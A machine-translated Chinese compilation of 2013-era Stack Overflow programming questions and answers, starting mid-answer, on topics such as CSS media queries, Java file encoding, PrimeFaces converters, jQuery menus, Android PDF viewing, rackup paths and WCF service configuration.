这样，您就可以摆脱较小设备上的所有混乱，并且可以通过简单地执行相反的操作来添加专门针对移动设备尺寸的代码：

```
<div class="row-fluid">
    <div id="show-mobile" class="span6">Your Beautiful Code For Mobile Only</div>
</div>

@media only screen and (min-width: 481px) {

    #show-mobile {

        display:none;

    }

}

@media only screen and (max-width: 480px) {

    #show-mobile {

        display:block;

    }

    #remove-mobile {

        display:none;

    }

} 
```

# java - 我在加载 .txt 文件时做错了什么？

> ID：14832898
> 
> 赞同：0
> 
> 时间：2013-02-12T12:45:15.357
> 
> 标签：java, string, equals, bufferedreader

```
try (BufferedReader br = new BufferedReader(new FileReader("Templates/format/test.txt")))
{

    String sCurrentLine;

    while ((sCurrentLine = br.readLine()) != null) {
        System.out.println(sCurrentLine.toString().trim());
        if(sCurrentLine.toString().trim().equalsIgnoreCase("Test2")){
            System.out.println("HI: "+sCurrentLine.toString().trim());
        }

    }

} catch (IOException e) {
    e.printStackTrace();
} 
```

我正在尝试获取 .txt 的内容，但都没有

```
if(sCurrentLine.toString().trim().equalsIgnoreCase("Test2")){
    System.out.println("HI: "+sCurrentLine.toString().trim());
} 
```

或者

```
if(sCurrentLine.toString().trim().equals("Test2")){
    System.out.println("HI: "+sCurrentLine.toString().trim());
} 
```

作品。

这是txt的内容：

```
Text1
Text2
Text3 
```

我也不明白为什么会这样：`System.out.println(sCurrentLine.toString().trim());`导致控制台中的以下输出。为什么我在开始时会出现中断和符号？

```
þÿ T e s t 1
T e s t 2
T e s t 3 
```

感谢您在这里帮助我！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:50:58.360

将您的 .txt 文件转换为没有 BOM 的 UTF-8。您可以使用 Notepad++ 或任何其他高级文本编辑器来做到这一点。

# jsf - OmniFaces：SelectItemsConverter 不适用于 PrimeFaces：PickList

> ID：14832899
> 
> 赞同：2
> 
> 时间：2013-02-12T12:45:30.163
> 
> 标签：jsf, primefaces, omnifaces

我正在尝试将 SelectItemsConverter 与 PrimeFaces Picklist 一起使用。

XHTML：

```
<p:pickList id="plUpdateFirma" value="#{bsvttController.dlmFirma}" var="plFirma"
    itemLabel="#{plFirma.schluesselFirma}" itemValue="#{plFirma}"
    converter="FirmaConverter">

    <f:facet name="sourceCaption">
        Vorjahr
    </f:facet>
    <f:facet name="targetCaption">
        #{bsvttController.selSaison}
    </f:facet>

    <p:column>
        #{plFirma.schluesselFirma}  
    </p:column>

</p:pickList> 
```

转换器：

```
@FacesConverter(value = "FirmaConverter")
public class FirmaConverter extends SelectItemsConverter
{ 

    @Override
    public String getAsString(final FacesContext facesContext, final UIComponent component, final Object object)
    {
        return ((Firma) object).getSchluesselFirma();
    }

} 
```

豆：

```
@ManagedBean
@ViewScoped
public class BsvttController implements Serializable
{
    private DualListModel<Firma> dlmFirma;
    private List<Firma> dlmFirmaSource;
    private List<Firma> dlmFirmaTarget;
    private Firma firma;

    @PostConstruct
    public void init()
    {
        dlmFirmaSource = FirmaPersistenz.leseFirmaAlle();
        dlmFirmaTarget = new ArrayList<Firma>();
        dlmFirma = new DualListModel<>(dlmFirmaSource, dlmFirmaTarget);
    }

    public DualListModel<Firma> getDlmFirma()
    {
        return dlmFirma;
    }
    public List<Firma> getDlmFirmaSource()
    {
        return dlmFirmaSource;
    }
    public List<Firma> getDlmFirmaTarget()
    {
        return dlmFirmaTarget;
    }

    public void setDlmFirma(DualListModel<Firma> dlmFirma)
    {
        this.dlmFirma = dlmFirma;
    }
    public void setDlmFirmaSource(List<Firma> dlmFirmaSource)
    {
        this.dlmFirmaSource = dlmFirmaSource;
    }
    public void setDlmFirmaTarget(List<Firma> dlmFirmaTarget)
    {
        this.dlmFirmaTarget = dlmFirmaTarget;
    }

} 
```

在调试转换器时，我可以看到 getAsString 方法工作正常。但是在提交表单后，两个数组列表（dlmFirmaSource 和 dlmFirmaTarget）都是空的。

OmniFaces 展示柜说

> “omnifaces.SelectItemsConverter 允许您使用复杂的 Java 模型对象作为 f:selectItems 的值填充例如下拉列表，并让 JSF 自动将这些对象转换回来，而无需提供可能需要根据可能完成工作的自定义转换器昂贵的服务/DAO 操作。”

但如果是 PickList 组件，则不存在任何 f:selectItems 标记。

SelectItemsConverter 是否甚至支持 PickList 组件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-25T19:11:47.977

> *SelectItemsConverter 是否甚至支持 PickList 组件？*

不，它没有。

从 OmniFaces 1.5 开始，您可以将`omnifaces.ListConverter`或`omnifaces.ListIndexConverter`用于所需的目的。另请参阅[展示示例，](http://showcase.omnifaces.org/converters/ListConverter)[该`ListConverter`](http://showcase.omnifaces.org/converters/ListConverter)示例还演示了`<p:pickList>`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T13:26:48.573

不，SelectItemsConverter 处理核心 JSF SelectItem 对象的转换，以便与各种 JSF 组件一起使用。

该类`DualListModel`是 PrimeFaces 特定类，旨在与高级 PrimeFaces 数据组件一起使用。解决方法当然是可以使用一种`@PostConstruct`方法在托管 bean 中初始化 DualListModel 以便它不需要转换器，或者您可以简单地以传统方式实现转换器。`converter`来自关于Pick List 属性的 PrimeFaces 指南：

> 为组件定义转换器的 el 表达式或文字文本。当它是一个 EL 表达式时，它被解析为一个转换器实例。如果是静态文本，则必须引用转换器 ID

# jquery - 禁用单击主菜单项而不是子菜单jquery

> ID：14832905
> 
> 赞同：0
> 
> 时间：2013-02-12T12:45:41.720
> 
> 标签：jquery, preventdefault

**HTML**

```
<ul id="nav">
    <li>
        <a href="#">Home</a>
    </li>

    <li>
        <a href="#">About</a>
        <ul>
            <li><a href="#">The product</a></li>

            <li><a href="#">Meet the team</a></li>
        </ul>
    </li>
    <li>
        <a href="#">Services</a>

        <ul>
            <li><a href="#">Sevice one</a></li>
            <li><a href="#">Sevice two</a></li>

            <li><a href="#">Sevice three</a></li>
            <li><a href="#">Sevice four</a></li>
        </ul>

    </li>
    <li>
        <a href="#">Product</a>
        <ul>
            <li><a href="#">Small product (one)</a></li>

            <li><a href="#">Small product (two)</a></li>
            <li><a href="#">Small product (three)</a></li>
            <li><a href="#">Small product (four)</a></li>

            <li><a href="#">Big product (five)</a></li>
            <li><a href="#">Big product (six)</a></li>
            <li><a href="#">Big product (seven)</a></li>

            <li><a href="#">Big product (eight)</a></li>
            <li><a href="#">Enourmous product (nine)</a></li>
            <li><a href="#">Enourmous product (ten)</a></li>

            <li><a href="#">Enourmous product (eleven)</a></li>
        </ul>
    </li>
    <li>
        <a href="#">Contact</a>

        <ul>
            <li><a href="#">Out-of-hours</a></li>
            <li><a href="#">Directions</a></li>

        </ul>
    </li>
</ul> 
```

**jQuery**

```
$('#nav li a').click(function(e){
    e.preventDefault();
}); 
```

试图禁止点击主菜单项，例如关于、服务等，它们有一个下拉菜单。使用上面的代码它只会禁用我的所有链接。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:46:21.857

要仅禁用顶层，请执行以下操作...

```
$('#nav > a').click(function(e){
    e.preventDefault();
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T12:52:55.147

为您的顶级链接提供不可点击的类并添加此脚本：

```
$('.not-clickable').click(function(e){
    e.preventDefault();
}); 
```

如果您有动态菜单，请尝试确定是否有子菜单，如果存在则将类添加到顶级元素。

编辑：通过使用 .not-clickable 类，你对未来也会更好。如果#nav li 变成了#nav2 li，你也需要改变你的javascript。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:47:23.290

试试这个

```
$('#nav li > a').click(function(e){
  -----^-- need a space here... or else it will search for id="navli" ;
   e.preventDefault(); 
```

});

**更新**

用于`siblings('ul')`在其中查找 ul ......检查长度是否大于 0 thn 它有下拉菜单......无需添加额外的类......

试试这个

```
$('#nav li > a').click(function(e){
     if($(this).siblings('ul').length > 0){
         e.preventDefault();
     }
}); 
```

[在这里摆弄](http://jsfiddle.net/bipen/DLMZj/)

# android - 如何在 Android 应用程序中从内部存储中查看 PDF 文件？

> ID：14832906
> 
> 赞同：3
> 
> 时间：2013-02-12T12:45:42.663
> 
> 标签：android, android-contentprovider

我制作了一个应用程序，我可以在其中通过 URL 成功地从 Internet 下载 pdf 文件。并通过创建文件夹 app_Pdf 将它们存储到应用程序的内部存储中。但现在我想用 adobe pdf 查看器等第三方应用程序打开该文件。我已经尝试了很多方法，我已经为这个问题看了很多。我还阅读了有关制作第一个内容提供者并通过此查询提供 pdf 文件的信息：[如何打开存储在内部存储器中的 PDF，](https://stackoverflow.com/questions/14327343/how-to-open-a-pdf-stored-in-internal-memory)但我收到错误：路径无效....

请任何朋友帮我解决这个问题。如果给我一些工作代码会很好提前非常感谢......

这就是我在内部存储器中下载和存储文件的方式：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    downloadFile("http://www.testdemo.net/testdemo/test/test/test.pdf");
}
public boolean downloadFile(String path)
{
    try
    {
        URL url = new URL(path);

        URLConnection ucon = url.openConnection();
        ucon.setReadTimeout(5000);
        ucon.setConnectTimeout(10000);

        InputStream is = ucon.getInputStream();
        BufferedInputStream inStream = new BufferedInputStream(is, 1024 * 5);

        File file = new File(getDir("Pdf", Context.MODE_WORLD_READABLE) + "/yourfile.pdf");

        if (file.exists())
        {
            file.delete();
        }
        file.createNewFile();

        FileOutputStream outStream = new FileOutputStream(file);
        byte[] buff = new byte[5 * 1024];

        int len;
        while ((len = inStream.read(buff)) != -1)
        {
            outStream.write(buff, 0, len);
        }

        outStream.flush();
        outStream.close();
        inStream.close();

    }
    catch (Exception e)
    {
        e.printStackTrace();
        return false;
    }

    return true;
} 
```

}

这就是我尝试从内部存储中查看 pdf 的方式：

```
 File file = new File(getDir("Pdf", Context.MODE_PRIVATE) + "/yourfile.pdf");
    Uri internal = Uri.fromFile(file);
    viewPdf(internal);

    private void viewPdf(Uri file) {
    Intent intent;
    intent = new Intent(Intent.ACTION_VIEW);
    intent.setDataAndType(file, "application/pdf");

    try {
        startActivity(intent);
    } catch (ActivityNotFoundException e) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("No Application Found");
        builder.setMessage("Download one from Android Market?");
        builder.setPositiveButton("Yes, Please",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        Intent marketIntent = new Intent(Intent.ACTION_VIEW);
                        marketIntent.setData(Uri.parse("market://details?id=com.adobe.reader"));
                        startActivity(marketIntent);
                    }
                });
        builder.setNegativeButton("No, Thanks", null);
        builder.create().show();
        Log.v("","Exception : "+e);
    } 
```

请帮我....

# java - 测量长时间间隔

> ID：14832907
> 
> 赞同：2
> 
> 时间：2013-02-12T12:45:43.537
> 
> 标签：java, android

检查`System.currentTimeMilllis()`它说的方法：

```
This method shouldn't be used for measuring timeouts or other 
elapsed time measurements, as changing the system time can affect the results. 
```

如果系统重置，其他方法（如 SystemClock.elapsedRealTime() 会重置）

因此，如果我想测量时间以便每两天执行一次某个操作，而不管用户是否更改系统时间，我该如何测量呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:48:48.937

您应该使用类似[`AlarmManager.setInexactRepeating(int, long, long, android.app.PendingIntent)`](http://developer.android.com/reference/android/app/AlarmManager.html#setInexactRepeating%28int,%20long,%20long,%20android.app.PendingIntent%29)方法定期启动您的操作

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:54:43.693

至于`Measure long time intervals`-您可以运行一个更新秒计数器的计时器，它不依赖于系统时间

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:55:59.727

试试这个：

```
private long difference ;

//This should be saved from when 2 days is to be checked
SharedPreferences myPrefs = context.getSharedPreferences("myPrefs",MODE_WORLD_READABLE);
        syncdate = myPrefs.getLong("difference", System.currentTimeMillis());

    String olddate = changeFormat(syncdate);
    String newdate = changeFormat(System.currentTimeMillis());//This is the new date
    difference = getDate(olddate, newdate);

        public static String changeFormat(long date){
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd");

            Date resultdate = new Date(date);
            String format = sdf.format(resultdate);
            return format;
        }

        public static long getDate(String firstdate,String SecondDate)
        {
            Calendar calendar1 = Calendar.getInstance();
            Calendar calendar2 = Calendar.getInstance();
            String arr[] =firstdate.split("/");
            String arr1[] = SecondDate.split("/");
            int sty =Integer.parseInt(arr[0]);
            int stm = Integer.parseInt(arr[1]);
            int std = Integer.parseInt(arr[2]);
            int sty1 = Integer.parseInt(arr1[0]);
            int stm1 = Integer.parseInt(arr1[1]);
            int std1 = Integer.parseInt(arr1[2]);

            calendar1.set(sty, stm, std);
            calendar2.set(sty1, stm1, std1);
            long milliseconds1 = calendar1.getTimeInMillis();
            long milliseconds2 = calendar2.getTimeInMillis();
            long diff = milliseconds2 - milliseconds1;
            long diffDays = diff / (24 * 60 * 60 * 1000);

            return diffDays;

        } 
```

# android - Android Map V2 - 为什么需要 MAPS_RECEIVE 权限

> ID：14832911
> 
> 赞同：32
> 
> 时间：2013-02-12T12:45:48.687
> 
> 标签：android, android-maps-v2

将此视为一个 wiki 问题。

当我设置我的项目以支持 Map V2 时，有一个步骤可以添加 MAPS_RECEIVE 权限。

```
<permission
          android:name="com.example.mapdemo.permission.MAPS_RECEIVE"
          android:protectionLevel="signature"/>
<uses-permission android:name="com.example.mapdemo.permission.MAPS_RECEIVE"/> 
```

为什么我们从应用程序本身创建和使用权限？

该谷歌播放服务应用程序是否使用此权限进行交互？

这个权限不能处理这些事情吗？

```
<uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES"/> 
```

我认为使用自定义权限是为了允许其他应用程序启动/使用我们应用程序的服务/资源。

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2013-07-30T02:31:16.360

对于未来的访客：

> 这个权限现在完全没有必要了。Google Play Services 3.1.59 的最新更新使其毫无用处。结果，它可以被删除。

[来源](https://plus.google.com/118417777153109946393/posts/Dk65EACXqsh)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-07T07:12:22.217

这与您在获得许可后使用[Google Cloud Messaging (GCM)](http://developer.android.com/google/gcm/gs.html)时看到的模式相同。`C2D_MESSAGE`这个想法是保护应用程序中的端点（例如广播接收器），以便其他一些组件（可能是 Maps API 的一部分）可以安全地联系它（否则，另一个应用程序可以通过使用相同的意图过滤器来模拟您的应用程序）。

在这种情况下，Maps API 会在内部设置这样一个端点（对您来说是透明的），并且可以通过使用此权限使该端点无法被模拟（因为这样做需要权限，该权限受您的保护应用程序签名）。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-02-09T18:59:49.033

此权限指定您的包名称。IE

```
 <permission
          android:name="package_name.permission.MAPS_RECEIVE"
          android:protectionLevel="signature"/>
  <uses-permission android:name="package_name.permission.MAPS_RECEIVE"/> 
```

因此，谷歌 API 只允许您的项目接收地图。权限告诉在哪里使用 API。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-01-06T16:00:00.357

我发现在使用调试证书的时候还是需要这个权限的。当我导出并签署我的应用程序时，它工作正常，但当我使用调试证书时它不起作用。我的调试证书和应用程序证书的 MD5 都与同一个密钥关联。当我最终添加这些额外的权限时，它起作用了。我正在使用运行 4.4 的 Moto X，一切都是最新的。

# java - 如何验证 JSoup 选择字符串

> ID：14832913
> 
> 赞同：1
> 
> 时间：2013-02-12T12:45:51.290
> 
> 标签：java, validation, selector, jsoup

我正在开发一个程序，让用户有机会定义自己的选择字符串。例如在表达式中：

```
doc.select("a[href]"); 
```

用户将指定“a[href]”部分。现在我的问题是，如何检查传入的字符串是否是有效的 JSoup 选择器字符串？有谁知道如何验证这一点？

任何帮助将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T18:16:12.067

**方法 1：**编辑 Jsoup 源并将 Parser 公开或在那里实现您自己的方法

**方法 2：**解析一个简单的*虚拟*元素并捕获异常。如果抛出一个：查询无效，否则没关系。不是最好的解决方案，但它有效。

*这是一个例子：*

```
private static final Element dummy = new Element(Tag.valueOf("p"), ""); // used for "testparsing"

// ...

public static boolean isValid(String query)
{
    if( query == null ) // Check for null
        return false;

    try
    {
        Selector.select(query, dummy); // Use the querystring on the dummy - returnvalue is not relevant
    }
    catch( Selector.SelectorParseException | IllegalArgumentException ex ) // these exceptions are thrown if something is not ok
    {
        return false; // If something is not ok, the query is invalid
    }

    return true; // All ok, query is valid
} 
```

*测试：*

```
System.out.println(isValid(null)); // not valid
System.out.println(isValid("div.abc")); // valid
System.out.println(isValid("p[")); // not valid
System.out.println(isValid("a:matchesxy")); // not valid
System.out.println(isValid("div > a")); // valid 
```

*测试结果：*

```
false
true
false
false
true 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T14:48:51.160

检查 jsoup 来源：您可以使用[Selector](http://jsoup.org/apidocs/org/jsoup/select/Selector.html)。Selector 使用的是不公开的 QueryParser，但您也可以“检查”它。

# mysql - 在mysql中查找非英文字符

> ID：14832919
> 
> 赞同：0
> 
> 时间：2013-02-12T12:46:09.597
> 
> 标签：mysql, non-english

我有一个 MySQL 表，它将电子邮件内容存储为`blob`数据类型。一些行中有非英文字符。有没有办法只找到包含非英文字符的行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:49:38.143

```
...
where some_column regexp '.*[^\\w.@].*' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-25T14:37:56.307

```
descr LIKE '%[' + CHAR(127)+ '-' +CHAR(255)+']%'  COLLATE Latin1_General_100_BIN2 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-02-16T08:43:03.337

select * from TABLE where COLUMN like '%\0%';

这在 MySQL 5.6 上对我有用，我很乐意使用，甚至不用考虑它是如何工作的。如果有人添加有关其工作原理的解释，将不胜感激。

# ruby - 如何从根目录外部构建配置文件？

> ID：14832920
> 
> 赞同：0
> 
> 时间：2013-02-12T12:46:10.990
> 
> 标签：ruby, rack

当我从我的应用程序目录中运行 rackup 时，它工作正常：

```
walkraft@li234-166:~/discourse$ rackup config.ru
Flushing redis (development mode)
/home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/activesupport-3.2.11/lib/active_support/dependencies.rb:251:in `block in require': iconv will be deprecated in the future, use String#encode instead.
/home/walkraft/discourse/vendor/gems/message_bus/lib/message_bus.rb:130: warning: already initialized constant ENCODE_SITE_TOKEN
>> Thin web server (v1.5.0 codename Knife)
>> Maximum connections set to 1024
>> Listening on 0.0.0.0:9292, CTRL+C to stop 
```

但是，如果我尝试从这个目录之外运行 rackup：

```
walkraft@li234-166:~$ rackup discourse/config.ru
/home/walkraft/discourse/config/application.rb:7:in `require': cannot load such file -- ./lib/discourse_plugin_registry (LoadError)
        from /home/walkraft/discourse/config/application.rb:7:in `<top (required)>'
        from /home/walkraft/.rvm/rubies/ruby-1.9.3-p374/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
        from /home/walkraft/.rvm/rubies/ruby-1.9.3-p374/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
        from /home/walkraft/discourse/config/environment.rb:2:in `<top (required)>'
        from /home/walkraft/.rvm/rubies/ruby-1.9.3-p374/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
        from /home/walkraft/.rvm/rubies/ruby-1.9.3-p374/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
        from /home/walkraft/discourse/config.ru:2:in `block in <main>'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/builder.rb:51:in `instance_eval'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/builder.rb:51:in `initialize'
        from /home/walkraft/discourse/config.ru:in `new'
        from /home/walkraft/discourse/config.ru:in `<main>'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/builder.rb:40:in `eval'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/builder.rb:40:in `parse_file'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/server.rb:200:in `app'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/server.rb:304:in `wrapped_app'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/server.rb:254:in `start'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/lib/rack/server.rb:137:in `start'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/gems/rack-1.4.4/bin/rackup:4:in `<top (required)>'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/bin/rackup:19:in `load'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/bin/rackup:19:in `<main>'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/bin/ruby_noexec_wrapper:14:in `eval'
        from /home/walkraft/.rvm/gems/ruby-1.9.3-p374/bin/ruby_noexec_wrapper:14:in `<main>' 
```

当我不在根目录中时，如何运行 rackup？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T13:33:42.223

如果您不想手动到 Discourse 根文件夹，那么为什么不直接在 rackup文件`cd`中添加一个修复：`config.ru`

```
# Insert as first line in config.ru
Dir.chdir(File.dirname(File.expand_path(__FILE__))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T13:44:52.610

实际上，这不是问题`rackup`; 你的代码有问题。

你有

```
require './lib/discourse_plugin_registry' 
```

某处。这并不理想。它应该是这样的：

```
require File.expand_path('../../lib/discourse_plugin_registry', __FILE__) 
```

您拥有它的方式，它显式地使用当前目录，并且无论您做什么`rackup`，直到您更改当前目录 - 它都不起作用。

# javascript - 如何使用 javascript 确认 window.confirm？

> ID：14832929
> 
> 赞同：0
> 
> 时间：2013-02-12T12:46:34.747
> 
> 标签：javascript, jquery, google-chrome, userscripts

我需要在一个窗口确认框中单击“确定”，该确认框可以预见地出现在我的用户脚本执行的某个点。通常当我需要这样做时，我只是在执行时查看源代码，无论窗口确认：

例如

```
...onclick="DoWathever()"> 
```

然后我会调用本机 DoWathever() 并绕过确认窗口。问题是，在调用window.confirm的毯子下的函数中，所以我无法使用这种简单的方式绕过。

话虽如此，我已经在 stackoverflow 和 google 上查看了可能的解决方案，并发现了一个：[在警报上单击“确定”或通过 jquery/javascript 确认对话框？](https://stackoverflow.com/questions/7705817/clicking-ok-on-alert-or-confirm-dialog-through-jquery-javascript)

这基本上建议我通过创建一个“假”window.confirm来覆盖默认确认，使用它：

```
window.alert = function() {
    console.log.apply(console, arguments);
    return true;
}; 
```

现在它变得很奇怪，我有两种使用这个解决方案的经验：

1）如果我只是在控制台手动声明它（我通常在将它实际包含在脚本中之前进行测试）它将完美地工作并确认对话框。

2）如果我将它包含在脚本中（在所有其他事情之前，请注意）它不会起作用，并且javascript会像往常一样通过确认窗口询问我。

所以...是的，任何想法为什么它在 2) 或任何可能的替代解决方案中不起作用？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-21T14:36:01.943

在用户脚本中，`window`与页面级别`window`所指的内容不同，因此您需要这样做：

```
unsafeWindow.alert = function() {
    console.log.apply(console, arguments);
    return true;
}; 
```

[`unsafeWindow`](http://wiki.greasespot.net/UnsafeWindow)在你这样做之前阅读危险。

# c# - WCF - 在 ASP.NET 应用程序中有多个 .svc 服务

> ID：14832934
> 
> 赞同：3
> 
> 时间：2013-02-12T12:46:55.667
> 
> 标签：c#, asp.net, wcf, jquery, wcf-binding

我在 Visual Studio 2010 中创建了一个 C#/ASP.NET 应用程序，并在其中创建了一个`service.svc`文件和相应的

*   `IService.cs`//合同
*   `Service.cs`//合约的实现-接口

这个 WCF 服务以 JSON 格式返回我的数据。我用 jQuery ajax 帖子击中了它。这项服务似乎可以按我的意愿工作，但后来我决定添加第二项服务，即`ServiceNew.svc`与其相应的服务

*   `IServiceNew.cs`//合同
*   `ServiceNew.cs`//合约的实现-接口

并在`web.config`.

在我添加了第二个 WCF 服务之后，所有服务都不起作用，它返回了 500 内部服务器错误。

最奇怪的部分是，如果我从我的应用程序的文件夹中删除所有新文件`ServiceNew.svc`，当我像以前一样使用 jQuery 帖子点击它们时`IServiceNew.cs`，`ServiceNew.cs`第一个`Service.svc`工作，然后如果我只是将这些文件再次复制回我的文件夹并运行Visual Studio 托管然后我的两个服务（旧的和新的）在随机的一段时间内工作，然后当我用 jQuery ajax 调用它们时它们再次突然返回 500 错误。

我`web.config`的是：

```
<system.serviceModel>       
   <behaviors>
     <serviceBehaviors>
       <behavior name="ServiceBehavior">
         <serviceMetadata httpGetEnabled="true"/>
         <serviceDebug includeExceptionDetailInFaults="true"/>
       </behavior>
     </serviceBehaviors>
     <endpointBehaviors>
       <behavior name="EndpBehavior">
         <webHttp/>
       </behavior>
     </endpointBehaviors>
   </behaviors>
   <services>
     <service behaviorConfiguration="ServiceBehavior" name="Service">
       <endpoint address="" binding="webHttpBinding"
           contract="IService" behaviorConfiguration="EndpBehavior"/>
     </service>
     <service behaviorConfiguration="ServiceBehavior" name="ServiceNew">
       <endpoint address="" binding="webHttpBinding"
           contract="IServiceNew" behaviorConfiguration="EndpBehavior"/>
     </service>
   </services>
 </system.serviceModel> 
```

`IService.cs`：

```
[ServiceContract]
public interface IService
{
    [OperationContract]
    [WebInvoke(Method = "POST",
 ResponseFormat = WebMessageFormat.Json, BodyStyle = WebMessageBodyStyle.Wrapped)]
    [return: MessageParameter(Name = "d")]
    MovieInfo GetMovieInfo(string title, string year);
} 
```

`Service.cs`：

```
[AspNetCompatibilityRequirements(RequirementsMode
    = AspNetCompatibilityRequirementsMode.Allowed)]
public class Service: IService
{
    public MovieInfo GetMovieInfo(string title, string year)
    {
          ...
          return MovieInfo();
        }
} 
```

相似地

`IServiceNew.cs`：

```
[ServiceContract]
public interface IServiceNew
{
    [OperationContract]
    [WebInvoke(Method = "POST",
 ResponseFormat = WebMessageFormat.Json, BodyStyle = WebMessageBodyStyle.Wrapped)]
    [return: MessageParameter(Name = "d")]
    string GetConf();
} 
```

`ServiceNew.cs`：

```
[AspNetCompatibilityRequirements(RequirementsMode
    = AspNetCompatibilityRequirementsMode.Allowed)]
public class ServiceNew: IServiceNew
{
    public string GetConf()
    {
          ...
          return conf;
        }
} 
```

有人可以告诉我我做错了什么吗？如何在 ASP.NET 应用程序中添加多个 WCF 服务（ .svc 文件），以便通过 jQuery ajax 调用来访问它们？

我的有什么问题`web.config`吗？

是别的吗？

谢谢

**更新：**

作为更新，我可以说，当我尝试调试其中一个 .svc 文件时，假设浏览器中的 ServiceNew.svc 会显示以下异常：

无法加载文件或程序集 'App_Web_oq2tdtg4，Version=0.0.0.0，Culture=neutral，PublicKeyToken=null' 或其依赖项之一。该系统找不到指定的文件。

堆栈跟踪：

[FileNotFoundException：无法加载文件或程序集“App_Web_oq2tdtg4，版本=0.0.0.0，文化=中性，PublicKeyToken=null”或其依赖项之一。系统找不到指定的文件。] System.Reflection.RuntimeAssembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, RuntimeAssembly locationHint, StackCrawlMark& stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection, Boolean suppressSecurityChecks) +0 System.Reflection.RuntimeAssembly.nLoad (AssemblyName fileName, String codeBase, Evidence assemblySecurity, RuntimeAssembly locationHint, StackCrawlMark & stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection, Boolean suppressSecurityChecks) +39 System.Reflection.RuntimeAssembly.InternalLoadAssemblyName(AssemblyName assemblyRef, Evidence assemblySecurity,

[ServiceActivationException：服务“/ServiceNew.svc”由于编译过程中的异常而无法激活。异常消息是：无法加载文件或程序集 'App_Web_oq2tdtg4，Version=0.0.0.0，Culture=neutral，PublicKeyToken=null' 或其依赖项之一。系统找不到指定的文件..] System.Runtime.AsyncResult.End(IAsyncResult result) +687598 System.ServiceModel.Activation.HostedHttpRequestAsyncResult.End(IAsyncResult result) +190 System.ServiceModel.Activation.HostedHttpRequestAsyncResult.ExecuteSynchronous(HttpApplication context , String routeServiceVirtualPath, Boolean flowContext, Boolean ensureWFService) +234 System.ServiceModel.Activation.HttpHandler.ProcessRequest(HttpContext context) +24 System.Web.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep。

装配负载跟踪：

以下信息有助于确定为什么无法加载程序集“App_Web_oq2tdtg4, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null”。

=== 预绑定状态信息 === LOG: User = ZULUTRADE\stassis LOG: DisplayName = App_Web_oq2tdtg4, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null (完全指定) LOG: Appbase = file:// /C:/Users/stassis/Documents/Development/theDreamBox/ LOG: Initial PrivatePath = C:\Users\stassis\Documents\Development\theDreamBox\bin

# 调用程序集：（未知）。

